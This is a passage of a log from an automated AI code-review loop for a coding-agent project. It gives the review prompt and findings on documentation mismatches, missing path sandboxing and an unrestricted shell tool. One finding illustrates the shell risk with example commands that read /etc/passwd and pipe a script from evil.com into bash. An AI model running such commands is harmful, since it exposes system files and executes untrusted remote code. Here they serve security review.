+  - **Mitigating factor:** The descriptions DO exist in `CODEAGENT.md:208-212`. The spec says "Store trace URLs in a known location (e.g., `docs/trace-links.md` **or** directly in CODEAGENT.md)" — since the descriptions are in CODEAGENT.md, the intent is partially satisfied. But `docs/trace-links.md` is the file listed in the story's **File List** as the deliverable, and it lacks the descriptions that Task 5 explicitly calls for alongside the URLs.
+
+### Finding 3.2: Cannot independently verify AC #3 (trace visibility) from artifacts
+
+- **Severity:** LOW
+- **Category:** SPEC_VIOLATION
+- **Evidence:**
+  - **AC #3:** "they can see every node, tool call, input/output, and metadata for each run"
+  - The trace URLs are JavaScript SPA pages that cannot be verified programmatically (WebFetch returns only the app bootstrap HTML, not rendered trace content). The story's completion notes state this was "manually verified" by Diane, which is appropriate for a manual execution task. However, there is no screenshot, exported trace summary, or other artifact that proves AC #3 was met — the only evidence is the completion note itself at `2-3-shareable-trace-links.md:75-76`.
+  - This is noted for completeness; it's inherent to the nature of external SPA links and the story being a manual task.
+
+### Finding 3.3: No coding-standards violations (N/A — no Python code produced)
+
+- **Severity:** N/A
+- **Category:** CONVENTION
+- **Evidence:** This story produced no Python source code or test files. The only artifact is `docs/trace-links.md`, a documentation file. Coding standards (naming, type hints, imports, docstrings, error handling, tool interface contract) are not applicable. YAML frontmatter requirements apply only to "inter-agent files (reviews, fix plans, test specs)" per `coding-standards.md:140-141`, not documentation files.
+
+---
+
+## Summary
+
+| Metric | Count |
+|---|---|
+| **Issues Found** | **5** |
+| **By Layer** | Blind Hunter: 2, Edge Case Hunter: 2, Acceptance Auditor: 1 (+ 2 informational) |
+| **By Severity** | Critical: 0, High: 0, Medium: 2, Low: 3 |
+
+**Overall Assessment:** This story is a manual execution and validation task, not a coding task. The tracing infrastructure was built in prior stories (2.1, 2.2). The only artifact — `docs/trace-links.md` — is functional but minimal to the point of being unhelpful as a standalone document. The two medium findings both relate to the same root issue: the file contains bare URLs without the descriptions that Task 5 calls for. The descriptions exist in CODEAGENT.md, so the downstream deliverable is well-served, but `docs/trace-links.md` itself falls short as a reference document. No critical or high-severity issues were found.
+================================================================================
+
+2026-03-24 11:48:57 [SUCCESS] Code review complete for 2-3-shareable-trace-links - Issues found: unknown - Duration: 1m 44s
+2026-03-24 11:48:57 [INFO] [4/4] Processing: 2-4-codeagent-mvp-sections (status: review)
+2026-03-24 11:48:57 [REVIEW] ==========================================
+2026-03-24 11:48:58 [REVIEW] Reviewing: 2-4-codeagent-mvp-sections (status: review)
+2026-03-24 11:48:58 [REVIEW] ==========================================
+2026-03-24 11:49:03 [INFO] Running read-only code review (tools: Read,Glob,Grep,Task,TodoWrite,Skill)...
+
+================================================================================
+PROMPT: Code Review | Story: 2-4-codeagent-mvp-sections | Time: 2026-03-24 11:49:03
+================================================================================
+You are performing a BMAD-style adversarial code review for story 2-4-codeagent-mvp-sections.
+
+SETUP: Read these files first for project context and coding standards:
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/_bmad-output/project-context.md
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/CLAUDE.md
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/coding-standards.md
+
+Then read the story spec file:
+  - /c/alcorn/Gauntlet/6-Shipyard/shipyard/_bmad-output/implementation-artifacts/2-4-codeagent-mvp-sections.md
+
+Then find and read ALL source files and test files referenced in or created by the story.
+
+CRITICAL: This is a READ-ONLY audit. Do NOT fix any issues. ONLY report them.
+
+YOU MUST EXECUTE ALL THREE REVIEW LAYERS BELOW:
+
+=== LAYER 1: BLIND HUNTER ===
+Review the code with NO regard for the spec — purely from what you see in the code itself.
+Find: bugs, security issues, logic errors, code quality problems, anti-patterns.
+For each finding: one-line title, severity (critical/high/medium/low), evidence from the code.
+
+=== LAYER 2: EDGE CASE HUNTER ===
+Walk every branching path and boundary condition. Report ONLY unhandled edge cases.
+Focus on: boundary conditions, missing validation, race conditions, platform-specific issues,
+encoding problems, empty inputs, path traversal, concurrency, error propagation.
+For each finding: one-line title, severity, the specific edge case, evidence.
+
+=== LAYER 3: ACCEPTANCE AUDITOR ===
+Review the implementation against the story spec and acceptance criteria.
+Check for: violations of acceptance criteria, deviations from spec intent,
+missing implementation of specified behavior, contradictions between spec constraints and code.
+Also check against coding-standards.md and CLAUDE.md rules.
+For each finding: one-line title, which AC/rule it violates, evidence.
+
+=== OUTPUT FORMAT ===
+Present findings grouped by layer. For each finding include:
+- One-line title
+- Severity: CRITICAL / HIGH / MEDIUM / LOW
+- Evidence: file path, line number, code snippet
+- Category: BUG / SECURITY / LOGIC / QUALITY / EDGE_CASE / SPEC_VIOLATION / CONVENTION
+
+End with a summary:
+Issues Found: [total count]
+By Layer: Blind Hunter: [N], Edge Case Hunter: [N], Acceptance Auditor: [N]
+By Severity: Critical: [N], High: [N], Medium: [N], Low: [N]
+
+================================================================================
+
+
+================================================================================
+OUTPUT: Code Review | Story: 2-4-codeagent-mvp-sections
+================================================================================
+Now I have all the context I need. Let me compile the full adversarial code review.
+
+---
+
+# BMAD Adversarial Code Review: Story 2.4 — CODEAGENT.md MVP Sections
+
+---
+
+## LAYER 1: BLIND HUNTER
+*Code-only review, no spec consideration*
+
+### Finding 1.1: CODEAGENT.md documents `list_files` parameter as `directory: str` but code uses `path: str`
+- **Severity:** MEDIUM
+- **Category:** QUALITY
+- **Evidence:** `CODEAGENT.md:81` states `list_files` parameters as `directory: str, pattern: str`, but `src/tools/search.py:19` defines `list_files(pattern: str, path: str = ".")`. The parameter names and order are swapped.
+
+### Finding 1.2: CODEAGENT.md documents `search_files` parameter as `directory: str, regex_pattern: str` but code uses `pattern: str, path: str`
+- **Severity:** MEDIUM
+- **Category:** QUALITY
+- **Evidence:** `CODEAGENT.md:82` states `search_files` parameters as `directory: str, regex_pattern: str`, but `src/tools/search.py:39` defines `search_files(pattern: str, path: str = ".")`. Both parameter names are wrong in the documentation.
+
+### Finding 1.3: CODEAGENT.md documents `run_command` parameter as `command: str` (single param) but code has `command: str, timeout: str`
+- **Severity:** LOW
+- **Category:** QUALITY
+- **Evidence:** `CODEAGENT.md:83` states `run_command` parameters as `command: str`, but `src/tools/bash.py:21` defines `run_command(command: str, timeout: str = "30")`. The `timeout` parameter is undocumented.
+
+### Finding 1.4: `agent_role` comment in state.py is incomplete compared to CODEAGENT.md
+- **Severity:** LOW
+- **Category:** QUALITY
+- **Evidence:** `src/agent/state.py:25` comments `agent_role` valid values as `"dev", "test", "reviewer", "architect"` — missing `"fix_dev"` which is listed in `src/multi_agent/roles.py:15` (`VALID_AGENT_ROLES = frozenset({"dev", "test", "reviewer", "architect", "fix_dev"})`). CODEAGENT.md:43 lists the correct four roles matching state.py but the actual implementation supports five.
+
+### Finding 1.5: `search_files` tool has no path sandbox validation
+- **Severity:** HIGH
+- **Category:** SECURITY
+- **Evidence:** `src/tools/search.py:39-73` — the `search_files` tool accepts `path: str = "."` and passes it directly to `os.walk()` without calling `_validate_path()`. A malicious path like `path="/etc"` would search outside the project root. Compare with `read_file` at `src/tools/file_ops.py:50` which validates via `_validate_path()`.
+
+### Finding 1.6: `list_files` tool has no path sandbox validation
+- **Severity:** HIGH
+- **Category:** SECURITY
+- **Evidence:** `src/tools/search.py:19-35` — the `list_files` tool accepts `path: str = "."` and passes it directly to `Path(path).glob()` without sandbox validation. A path like `path="/etc"` would list files outside the project root.
+
+### Finding 1.7: `docs/trace-links.md` contains only bare URLs with no descriptions
+- **Severity:** LOW
+- **Category:** QUALITY
+- **Evidence:** `docs/trace-links.md` contains just two bare URLs with no context, descriptions, or labels. Compare with `CODEAGENT.md:208-212` where each link has a description. The `docs/trace-links.md` file is a poor reference artifact on its own.
+
+### Finding 1.8: `_ensure_reviews_dir()` destructively deletes all previous reviews
+- **Severity:** MEDIUM
+- **Category:** LOGIC
+- **Evidence:** `src/multi_agent/orchestrator.py:66-69` calls `shutil.rmtree(REVIEWS_DIR)` before creating reviews. If multiple orchestrator runs share the same directory without coordination, this deletes all prior review artifacts without warning. This is a destructive operation with no confirmation or backup.
+
+---
+
+## LAYER 2: EDGE CASE HUNTER
+*Boundary conditions and unhandled edge cases*
+
+### Finding 2.1: Mermaid diagram in CODEAGENT.md checks `retry_count >= 50` but `should_continue` checks after increment
+- **Severity:** MEDIUM
+- **Category:** EDGE_CASE
+- **Evidence:** `CODEAGENT.md:31` shows `should_continue -->|retry_count >= 50| error`. In the actual code, `agent_node` (`src/agent/nodes.py:60`) increments `retry_count` *before* `should_continue` runs. So `should_continue` at `nodes.py:111` checks `if retry_count >= MAX_RETRIES` (50). Since `agent_node` already incremented, the effective check means the agent gets 49 LLM calls (turns 1-49), not 50. The diagram and prose say 50 turns but the code delivers 49.
+
+### Finding 2.2: `edit_file` allows `old_string == new_string` (no-op edit)
+- **Severity:** LOW
+- **Category:** EDGE_CASE
+- **Evidence:** `src/tools/file_ops.py:67-96` — there's no check for `old_string == new_string`. An agent could repeatedly call `edit_file` with identical strings, getting `SUCCESS` each time while burning turns. This is a wasted-turn scenario.
+
+### Finding 2.3: `list_files` and `search_files` have no check for binary files
+- **Severity:** LOW
+- **Category:** EDGE_CASE
+- **Evidence:** `src/tools/search.py:52` catches `UnicodeDecodeError` in `search_files` (silently skipping binary files), but this creates a subtle behavior inconsistency — binary files are included in `list_files` results (line 22-23) but silently excluded from `search_files`. An agent could see a file in `list_files` output but get no matches from `search_files` for it, causing confusion.
+
+### Finding 2.4: `run_command` with `shell=True` accepts arbitrary commands
+- **Severity:** MEDIUM
+- **Category:** EDGE_CASE
+- **Evidence:** `src/tools/bash.py:32` uses `shell=True` which allows command chaining via `&&`, `||`, `;`, pipes, and redirects. While `cwd` is locked to project root (`src/tools/bash.py:38`), the command can still do `cd /etc && cat passwd` or `curl evil.com | bash` since there's no command allowlisting. CODEAGENT.md mentions "sandbox all run_command tool execution" at `project-context.md:125`, but the implementation only sandboxes the working directory, not the command itself.
+
+### Finding 2.5: `timeout` parameter in `run_command` is a string, not an int
+- **Severity:** LOW
+- **Category:** EDGE_CASE
+- **Evidence:** `src/tools/bash.py:21` defines `timeout: str = "30"`. Per the coding standards (`coding-standards.md:106`): "Parameters are strings (LLM-consumable types)". This is correct by convention, but the string-to-int conversion at line 24 could receive non-numeric strings like `"thirty"`, a float like `"30.5"`, or negative values. The code handles the `ValueError` case but an `int("30.5")` also raises `ValueError`, so this is actually fine. **Edge case noted but adequately handled.**
+
+### Finding 2.6: CLI loop reinvokes graph without accumulating messages across turns
+- **Severity:** MEDIUM
+- **Category:** EDGE_CASE
+- **Evidence:** `src/main.py:150-156` — each CLI iteration calls `graph.invoke()` with only the new `HumanMessage`. While SQLite checkpointing should accumulate messages via `thread_id`, the `"messages"` key in the initial state only contains the new message. If LangGraph's `MessagesState` reducer uses `operator.add`, the new message appends to the checkpoint. But if the graph is invoked with `messages=[new_msg]`, LangGraph might interpret this as the full message list. The behavior depends on LangGraph's reducer semantics — if it replaces rather than appends, multi-turn CLI conversations would lose history.
+
+---
+
+## LAYER 3: ACCEPTANCE AUDITOR
+*Story spec and acceptance criteria verification*
+
+### Finding 3.1: AC #1 — Agent Architecture section is present and substantive
+- **Severity:** N/A (PASS)
+- **Category:** SPEC_VIOLATION
+- **Evidence:** CODEAGENT.md lines 6-98 contain: loop design (lines 13-23), tool calls (lines 72-83), state management (lines 36-47), entry/exit conditions (lines 49-63), error branches (lines 60-63), and a Mermaid diagram (lines 25-34). **All AC #1 elements are present.**
+
+### Finding 3.2: AC #2 — File Editing Strategy section is present and substantive
+- **Severity:** N/A (PASS)
+- **Category:** SPEC_VIOLATION
+- **Evidence:** CODEAGENT.md lines 101-142 contain: exact mechanism step-by-step (lines 103-115), how the agent locates blocks (lines 126-129), what happens on wrong location (lines 128-131). **All AC #2 elements are present.**
+
+### Finding 3.3: AC #3 — Trace Links section contains 2 shareable LangSmith URLs
+- **Severity:** N/A (PASS)
+- **Category:** SPEC_VIOLATION
+- **Evidence:** CODEAGENT.md lines 207-212 contain two LangSmith URLs, each with a 1-sentence description: Trace 1 (normal run) and Trace 2 (error recovery). URLs match those in `docs/trace-links.md`. **AC #3 satisfied.**
+
+### Finding 3.4: CODEAGENT.md tool parameter names don't match actual code (documentation accuracy)
+- **Severity:** MEDIUM
+- **Category:** SPEC_VIOLATION
+- **Evidence:** AC #1 requires "Tool Calls" documentation. The tool table at CODEAGENT.md:76-83 lists `list_files(directory, pattern)` and `search_files(directory, regex_pattern)`, but the actual code at `src/tools/search.py` uses `list_files(pattern, path)` and `search_files(pattern, path)`. The story says "an evaluator can understand the agent without reading source code" (Task 5, subtask 2) — inaccurate parameter names defeat this goal.
+
+### Finding 3.5: Multi-Agent Design section was NOT in the story scope but was added
+- **Severity:** LOW
+- **Category:** SPEC_VIOLATION
+- **Evidence:** The story spec says MVP requires three sections: "Agent Architecture, File Editing Strategy, Trace Links" and "Additional sections (Multi-Agent Design...) are added in Epic 3 and Epic 5." But CODEAGENT.md:145-203 includes a substantial Multi-Agent Design section. This exceeds the story scope. While not harmful, it means work was done that belongs to Story 3.6 ("CODEAGENT.md Multi-Agent Design"). This could create confusion about story boundaries and what was actually delivered in which story.
+
+### Finding 3.6: Mermaid diagram node names don't exactly match code node names
+- **Severity:** LOW
+- **Category:** CONVENTION
+- **Evidence:** CODEAGENT.md Mermaid diagram (line 27) uses `agent[agent_node<br/>Call Claude with tools]` and `tools[tool_node<br/>Execute tool calls]`, but the actual graph at `src/agent/graph.py:26-28` registers nodes as `"agent"`, `"tools"`, and `"error_handler"`. The diagram labels say `agent_node` / `tool_node` (the function names) rather than `"agent"` / `"tools"` (the node names). Minor inconsistency but could confuse an evaluator reading traces where node names appear as `"agent"` and `"tools"`.
+
+### Finding 3.7: `should_continue` in Mermaid shows 3 routes but diagram text says "no tool_calls" → END
+- **Severity:** LOW
+- **Category:** CONVENTION
+- **Evidence:** CODEAGENT.md line 21 describes `should_continue` as: "If the AI message contains `tool_calls`, route to `tool_node`. Otherwise, route to `END`." But the actual function (`src/agent/nodes.py:105-119`) has three routes: `"tools"`, `"end"`, and `"error"`. The Mermaid diagram correctly shows all three, but the prose description at line 21 omits the error route. Inconsistency between prose and diagram within the same document.
+
+### Finding 3.8: Coding standards compliance — `_validate_review_file` uses bare `except Exception`
+- **Severity:** LOW
+- **Category:** CONVENTION
+- **Evidence:** `src/multi_agent/orchestrator.py:85-86` uses `except Exception:` without `as e:`. The coding standards at `coding-standards.md:79` say "Never use bare `except:` — always `except Exception as e:` minimum." While `except Exception:` is not a *bare* except, the coding standard's spirit and example (line 92: `except Exception as e:`) suggest the `as e:` binding is expected. The exception is silently swallowed with no logging.
+
+---
+
+## SUMMARY
+
+| Metric | Count |
+|---|---|
+| **Issues Found** | **15** (excluding 3 PASSes) |
+| **By Layer** | Blind Hunter: 8, Edge Case Hunter: 6, Acceptance Auditor: 5 (+ 3 passing ACs) |
+| **By Severity** | Critical: 0, High: 2, Medium: 6, Low: 7 |
+
+### Key Takeaways
+
+**Highest Priority (HIGH):**
+1. **Security: `list_files` and `search_files` lack path sandbox validation** (Findings 1.5, 1.6) — These tools can read outside the project root, violating the security model documented in both `project-context.md` and `coding-standards.md`. While this is a pre-existing issue not introduced by Story 2.4, the CODEAGENT.md documentation doesn't mention this gap.
+
+**Documentation Accuracy (MEDIUM):**
+2. **Tool parameter names are wrong** (Findings 1.1, 1.2, 3.4) — The CODEAGENT.md tool table lists incorrect parameter names for `list_files` and `search_files`. An evaluator reading only the doc would have a false understanding of the tool interface.
+3. **Turn count off-by-one** (Finding 2.1) — The agent gets 49 effective turns, not 50 as documented.
+
+**Scope Creep (LOW):**
+4. **Multi-Agent Design section was delivered ahead of its story** (Finding 3.5) — Not harmful but blurs story boundaries.
+================================================================================
+
+2026-03-24 11:51:37 [SUCCESS] Code review complete for 2-4-codeagent-mvp-sections - Issues found: unknown - Duration: 2m 34s
+2026-03-24 11:51:38 [INFO] 
+2026-03-24 11:51:38 [INFO] ============================================================
+2026-03-24 11:51:38 [INFO] CODE REVIEW LOOP COMPLETE
+2026-03-24 11:51:38 [INFO] ============================================================
+2026-03-24 11:51:39 [INFO] Epic: 2
+2026-03-24 11:51:39 [INFO] Total stories: 4
+2026-03-24 11:51:39 [SUCCESS] Reviewed: 4
+2026-03-24 11:51:39 [INFO] Total duration: 12m 10s
+2026-03-24 11:51:39 [INFO] Full log: /c/alcorn/Gauntlet/6-Shipyard/shipyard/looper/epic2-code-review-bmad.log
+2026-03-24 11:51:40 [INFO] Results only: /c/alcorn/Gauntlet/6-Shipyard/shipyard/looper/epic2-code-review-bmad-results.log
+2026-03-24 11:51:40 [INFO] ============================================================
+
+============================================================
+SUMMARY
+============================================================
+Epic: 2
+Total stories: 4
+Reviewed: 4
+Skipped: 0
+Failed: 0
+Total duration: 12m 10s
+============================================================
